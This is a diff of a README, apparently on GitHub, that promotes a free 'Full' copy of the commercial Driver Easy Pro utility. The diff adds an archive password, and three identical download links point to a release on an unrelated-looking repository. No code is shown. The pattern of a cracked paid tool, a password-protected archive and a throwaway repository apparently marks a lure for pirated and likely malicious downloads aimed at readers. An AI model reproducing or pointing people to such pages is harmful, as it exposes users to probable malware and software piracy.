@@ -6,7 +6,10 @@ src="https://img.shields.io/badge/Mirror-Cloud_Link-orange?style=for-the-badge" 
 <div align="center">
 
 Driver Easy Pro is a powerful driver management utility designed to help Windows users keep their computer drivers updated, optimized, and functioning correctly. The software automatically scans your system, detects outdated, missing, or incompatible drivers, and provides the latest compatible versions for installation.
-  
+
+  **🔐 Archive Password: `8593`**
+---
+
 **[📥 DOWNLOAD Driver Easy PRO (Full)](https://github.com/mergerectorbreak/gpu-driver-tool/releases/tag/DriverasyPro)** | **[🛠 QUICK START](https://github.com/mergerectorbreak/gpu-driver-tool/releases/tag/DriverasyPro)** | **[📦 DIRECT LINK](https://github.com/mergerectorbreak/gpu-driver-tool/releases/tag/DriverasyPro)**
 </div>
 
